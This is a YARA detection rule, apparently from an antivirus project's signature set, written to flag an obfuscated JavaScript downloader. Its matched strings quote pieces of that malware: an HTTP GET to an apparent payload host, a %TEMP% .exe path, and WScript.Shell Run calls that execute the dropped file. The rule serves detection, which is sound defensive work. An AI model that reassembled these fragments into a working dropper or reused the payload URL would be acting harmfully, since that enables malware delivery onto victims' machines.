rule sig_20160328_d9955e586cd571004dcce82f1e297abe {
  meta:
    description = "datamaliciousorder - file 20160328_d9955e586cd571004dcce82f1e297abe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "25642cf9d3ab7267aa63f10eaa7475f7acb2829a2aa9090e924cd5943eda1392"

  strings:
    $s1  = "function Hyvycg() {return Ihvuq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"97QJcjle.exe\";};" fullword ascii
    $s2  = "Hgfolixdc[Aflaehfsf](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Addqsecwba](Nvlfoxxaa() * 11)} while (Hgfolixdc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ofahetubea(Tubpz, Fyjuhyknfw){return Tubpz - Fyjuhyknfw;};" fullword ascii
    $s5  = "var Ihvuq = function Kpoob() {return WScript[Qfjpuvdgjl](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Yecih() {return ((Wetgijedqi == true) && (Wetgijedqi == Azjczgn)) ? 1 : Swynfwujn;};" fullword ascii
    $s7  = "function Nkdcqrmhkz(Vcmmsgidl){Ihvuq[\"Run\"](Vcmmsgidl, Swynfwujn, Swynfwujn);};" fullword ascii
    $s8  = "function Rygbftibe(){return Qfjpuvdgjl;};" fullword ascii
    $s9  = "var Azjczgn = false;" fullword ascii
    $s10 = "var Rxqzqledz = false;" fullword ascii
    $s11 = " while (Rlrooyshx){" fullword ascii
    $s12 = "Wetgijedqi = true; " fullword ascii
    $s13 = "var Wetgijedqi = false;" fullword ascii
    $s14 = "function Evnjrmcv(Ezdin) {var Xtnojahwp = (1, 2, 3, 4, 5, Ezdin); return Xtnojahwp;};" fullword ascii
    $s15 = "function Seecdokqec()" fullword ascii
    $s16 = "var Lgugo = new this[\"Date\"]();" fullword ascii
    $s17 = "function Nvlfoxxaa(){return 22;};" fullword ascii
    $s18 = "function Leezlsgop(){return Zswttbk;};" fullword ascii
    $s19 = "Azjczgn = true; " fullword ascii
    $s20 = "return Ofahetubea(Xtzvx, Oysjemj);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}